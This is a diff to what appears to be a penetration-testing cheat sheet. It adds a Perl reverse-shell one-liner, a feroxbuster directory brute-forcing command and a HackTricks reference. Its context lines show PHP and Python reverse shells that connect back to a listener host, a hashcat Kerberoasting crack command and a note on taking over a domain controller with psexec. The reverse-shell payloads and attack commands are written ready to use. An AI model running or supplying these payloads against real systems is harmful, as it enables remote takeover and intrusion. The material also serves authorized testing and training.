@@ -196,7 +196,7 @@ TABLE OF CONTENTS
                         hashcat -m 13100 -a 0 <HASHFILE> <WORDLISTFILE>
         7.5 EXPLOIT
                 - Use msfconsole psexec module to pwn the DC with new creds. Access as service account
-8. REVERSE SHELLS [3]
+8. REVERSE SHELLS [3][37]
         8.1 PHP
                 8.1.1
                         <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1'");?>
@@ -213,6 +213,9 @@ TABLE OF CONTENTS
         8.4 PYTHON
                 8.4.1
                         python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+        8.5 PERL
+                8.5.1
+                        perl -e 'use Socket;$i="<LISTENER_IP>";$p=<LISTENER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 11. CORS
         11.1 REFLECTED ORIGIN HEADER IN Access-Control-Allow-Origin HEADER
                 11.1.1 DESCRIPTION
@@ -320,7 +323,7 @@ TABLE OF CONTENTS
                                 8
                                 SMUGGLED
                                 0
-19. DIRBUSTER
+19. DIRBUSTING
         19.1 ADVANCED OPTIONS
                 19.1.1 HTTP OPTIONS
                         19.1.1.1 CUSTOM HTTP HEADERS
@@ -333,6 +336,10 @@ TABLE OF CONTENTS
                 19.1.2 SCAN OPTIONS
                         19.1.2.1 
                                 Limit number of requests per second to increase stealth
+        19.2 FEROXBUSTER
+                Much better than any other dir brute forcing tool. Supports multiple http verbs AND recursion.
+                19.2.1 Example
+                        feroxbuster -u "http://apigateway:8000" -m GET,POST -w /usr/share/wordlists/dirb/small.txt -s 200,400,401,403,500 --force-recursion -d 2
                                 
 19. XXE INJECTION
         19.1 BASICS
@@ -702,3 +709,6 @@ References
 [34] https://portswigger.net/web-security/oauth
 [35] https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
 [36] https://portswigger.net/web-security/cors/lab-breaking-https-attack
+[37] https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
+
+
